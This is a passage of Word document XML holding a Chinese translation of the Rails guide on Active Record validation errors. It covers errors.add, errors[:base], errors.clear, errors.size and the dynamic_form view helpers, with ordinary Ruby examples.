      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors.full_messages</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors.to_a</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法将错误信息展示在用户的表单上。这些特定的错误信息添加了属性(首字母大写)名称作为前缀。</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>add</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法需要传入属性名称以及错误信息两个参数。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="4356671C" w14:textId="77777777" w:rsidTr="00E806C3">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="680C6B8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3F86CEB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a_method_used_for_validation_purposes</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31B65D0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E806C3">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>errors.add(:name, "cannot contain the characters !@#%*()_-+=")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C1B1DF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7758AF4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2049BD0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47E61EF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 = Person.create(:name</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "!@#")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="623DFC7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F0C015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person.errors[:name]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A9BDD0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 =&gt; ["cannot contain the characters !@#%*()_-+="]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="187AB2B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36266B7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person.errors.full_messages</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7AF5D0C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 =&gt; ["Name cannot contain the characters !@#%*()_-+="]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="64BE85B2"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也可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>[]=</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 达到同样的目的</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="301E3B3E" w14:textId="77777777" w:rsidTr="00E806C3">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C1BE66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556347C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a_method_used_for_validation_purposes</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5CC64E7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errors[:name] = "cannot contain the characters !@#%*()_-+="</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EBD715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04B1FA5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3ADD860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5F6B19F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person = Person.create(:name</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "!@#")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2ACF589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6F86867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person.errors[:name]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16E1C63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 =&gt; ["cannot contain the characters !@#%*()_-+="]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E7D37E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54D6FE5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person.errors.to_a</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56E87D5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 =&gt; ["Name cannot contain the characters !@#%*()_-+="]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="12D386ED"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8.4 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors[:base]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57EBFDE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你也可以</w:t>
      </w:r>
      <w:r w:rsidRPr="005A1C56">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>将添加的错误信息关联到对象自身整体，而不是特定的某一属性</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。当你想要表示该对象为无效的，而不在乎它的属性值如何时，可以使用该方法。由于 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors[:base]</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是一个数组，所以我们只需要将错误信息直接添加进这个数组就可以了，</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7536"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="171AD5E1" w14:textId="77777777" w:rsidTr="006143B4">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1379400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2D9AC2C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a_method_used_for_validation_purposes</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="252E615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6143B4">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>errors[:base] &lt;&lt; "This person is invalid because ..."</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F5A4BA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461462B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B8BC757"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8.5 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors.clear</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C6B540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当你想要清空 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 集合中的所有错误信息时，可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>clear</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法。当然，在一个校验后无效的对象上调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors.clear</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法并不能使其变为有效：虽然在调用完该方法后 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 集合为空，但是下次你再调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>valid?</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者其他试图将该对象保存到数据库的方法时，校验会再执行。而任何校验失败时，错误信息就又会被添加入 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 集合中。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8376"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="0C42CE39" w14:textId="77777777" w:rsidTr="00241678">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C849C3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066AB35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:name,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 :length</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :minimum</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 3</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466FE38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4D77BB3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0555B6F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 = Person.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="445841D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person.valid? # =&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08E2025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person.errors[:name]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="617F758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 =&gt; ["can't be blank", "is too short (minimum is 3 characters)"]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71CD8EC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5EBE326" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00126AA5">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>person.errors.clear</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75762E1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person.errors.empty? # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51D37AA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391639F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p.save # =&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24BA303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15D7868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p.errors[:name]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0850511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 =&gt; ["can't be blank", "is too short (minimum is 3 characters)"]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="79EE1A66"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8.6 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors.size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E77B60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size</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法可以</w:t>
      </w:r>
      <w:r w:rsidRPr="00126AA5">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>返回被校验对象的错误信息总数</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522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="18F70DB3" w14:textId="77777777" w:rsidTr="00126AA5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="118E6DC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Person &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2016393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:name,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 :length</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :minimum</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 3</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F9DEF9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38FD29F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633F550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 = Person.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FADA9C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person.valid? # =&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14575F5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person.errors.size # =&gt; 2</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76F2100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3F5CF06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 = Person.new(:name</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "Andrea", :email</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "andrea@example.com")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B80350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person.valid? # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="307F268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person.errors.size # =&gt; 0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="58D54605"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9 在View中展示校验错误信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08EC1E4A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="008938C9" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId200" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>DynamicForm</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 提供了一些 helpers 可以帮助我们在视图的模板中显示错误信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6552A2A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你可以通过在 Gemfile 文件中添加下面这行代码来安装该 gem 包：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2376"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="7C433F1D" w14:textId="77777777" w:rsidTr="00AA0A9B">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2E3682C3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="337852520"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>gem "dynamic_form"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3AD9384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现在你就可以在试图模板中访问 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>error_messages</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>error_messages_for</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 两个 helper 方法了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A51595B"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9.1 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>error_messages</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
